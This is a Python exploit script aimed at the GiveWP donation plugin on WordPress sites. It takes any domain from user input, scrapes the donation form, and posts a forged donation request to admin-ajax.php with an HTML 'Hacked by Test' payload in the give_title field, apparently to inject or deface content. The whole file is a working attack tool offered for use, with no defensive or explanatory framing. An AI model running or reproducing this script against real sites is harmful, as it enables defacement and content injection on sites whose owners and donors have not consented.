import requests
import logging
from bs4 import BeautifulSoup
import random
import string

# Set up logging for detailed output
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

def generate_random_string(length=8):
    """Generate a random string of fixed length."""
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def find_donation_form(donation_page_url):
    """Locate the donation form on the page."""
    try:
        logging.debug(f"Attempting to access: {donation_page_url}")
        response = requests.get(donation_page_url)
        logging.debug(f"Received response with status code: {response.status_code}")
        response.raise_for_status()

        soup = BeautifulSoup(response.text, 'html.parser')
        logging.debug("Searching for donation form in the page HTML...")

        # Find the form with method="post" since it's a typical form attribute for submissions
        form = soup.find('form', {'method': 'post'})
        if form:
            logging.debug("Donation form found.")
            return form
        else:
            logging.error("No donation form found on the page.")
            logging.debug("Full HTML content for debugging:")
            logging.debug(soup.prettify())

    except Exception as e:
        logging.error(f"Error finding form: {str(e)}")
    return None

def prepare_payload(domain, form, form_id):
    """Prepare the payload to exploit the form."""
    try:
        logging.debug("Preparing payload...")
        
        first_name = generate_random_string()
        last_name = generate_random_string()
        email_prefix = generate_random_string()
        payload = '<h1 style="color:red;">Hacked by Test</h1>'

        urls = {
            "url1": f'https://{domain}/wp-admin/admin-ajax.php',
            "url2": form.get('action', f'https://{domain}/')
        }

        data = {
            'give-honeypot': '',
            'give-form-id-prefix': f'{form_id}-1',
            'give-form-id': form_id,
            'give-form-title': '0',
            'give-current-url': f'https://{domain}/',
            'give-form-url': urls["url2"],
            'give-form-minimum': '',
            'give-form-maximum': '999999.99',
            'give-form-hash': generate_random_string(32),
            'give-price-id': '1',
            'give-amount': '25',
            'give_first': first_name,
            'give_last': last_name,
            'give_email': f'{email_prefix}@test.com',
            'payment-mode': 'manual',
            'give_action': 'purchase',
            'give-gateway': 'manual',
            'give_embed_form': '1',
            'action': 'give_process_donation',
            'give_ajax': 'true',
            'give_title': payload
        }

        logging.debug("Payload prepared successfully.")
        return data, urls["url1"]

    except Exception as e:
        logging.error(f"Error preparing payload: {str(e)}")
        return None, None

def send_exploit(domain, donation_page_url):
    """Attempt to exploit the form by sending crafted requests."""
    form = find_donation_form(donation_page_url)
    if not form:
        logging.error("Could not find form.")
        return False

    form_id = form.get('id', 'give-form-1')
    
    data, target_url = prepare_payload(domain, form, form_id)
    if not data:
        logging.error("Payload preparation failed.")
        return False

    # Send the malicious payload
    try:
        logging.info(f"Sending exploit to {target_url}...")
        response = requests.post(target_url, data=data)
        logging.debug(f"Exploit response status code: {response.status_code}")
        if response.status_code == 200:
            logging.info("Exploit sent successfully!")
        else:
            logging.info("Exploit attempt failed.")
        return True
    except Exception as e:
        logging.error(f"Error sending exploit: {str(e)}")
        return False

# Example usage
domain = input("Please enter the domain (e.g., example.com): ")
donation_page_url = input("Please enter the full donation form URL (e.g., https://example.com/donations/donation-form): ")
if not send_exploit(domain, donation_page_url):
    logging.info("Exploit attempt failed or no vulnerabilities found.")
